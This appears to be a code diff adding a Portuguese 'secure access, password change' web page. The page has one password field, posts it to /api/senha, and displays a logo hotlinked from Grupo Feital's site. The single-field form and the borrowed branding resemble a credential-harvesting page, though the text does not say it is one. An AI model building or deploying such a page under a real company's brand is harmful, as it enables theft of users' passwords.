@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Acesso Seguro – Alteração de Senha</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <h2>Acesso Seguro – Alteração de Senha</h2>
+  <form id="senhaForm">
+    <input type="password" id="senha" placeholder="Digite a senha" required />
+    <br />
+    <button type="submit">Enviar</button>
+  </form>
+
+  <img src="https://grupo.feital.com.br/images/logo.png" alt="Grupo Feital" />
+
+  <script>
+    document.getElementById("senhaForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const senha = document.getElementById("senha").value;
+
+      const response = await fetch("/api/senha", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ senha })
+      });
+
+      if (response.ok) {
+        alert("Senha enviada com sucesso!");
+        document.getElementById("senha").value = "";
+      } else {
+        alert("Erro ao enviar senha.");
+      }
+    });
+  </script>
+</body>
+</html>
